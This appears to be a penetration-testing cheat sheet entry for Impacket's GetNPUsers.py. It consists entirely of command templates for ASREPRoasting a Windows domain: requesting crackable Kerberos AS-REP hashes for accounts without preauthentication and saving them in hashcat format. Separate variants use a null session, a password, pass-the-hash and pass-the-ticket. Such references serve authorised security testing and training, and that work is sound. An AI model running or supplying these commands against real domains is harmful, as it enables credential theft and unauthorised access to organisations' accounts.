# GetNPUsers.py(imp)

% impacket-kerberos, windows, kerberos, 88, ASREPRoasting

#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 

## desc
```
Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
```

## ASREPRoasting (null session)
```bash
GetNPUsers.py  -request -format hashcat -outputfile <outfile|npuser.hash> -dc-ip <dc_fqdn> -no-pass <domain_fqdn>/
```

## ASREPRoasting (creds)
```bash
GetNPUsers.py -request -format hashcat -outputfile <outfile|npuser.hash> -dc-ip <dc_fqdn> <domain_fqdn>/<user>:'<password>'
```

## ASREPRoasting (pth)
```bash
GetNPUsers.py  -request -format hashcat -outputfile <outfile|npuser.hash> -dc-ip <dc_fqdn> -hashes :<nt_hash> <domain_fqdn>/<user>
```

## ASREPRoasting (ptt)
```bash
KRB5CCNAME=<ccache> GetNPUsers.py  -request -format hashcat -outputfile <outfile|npuser.hash> -dc-ip <dc_fqdn> -no-pass -k <domain_fqdn>/<user>
```
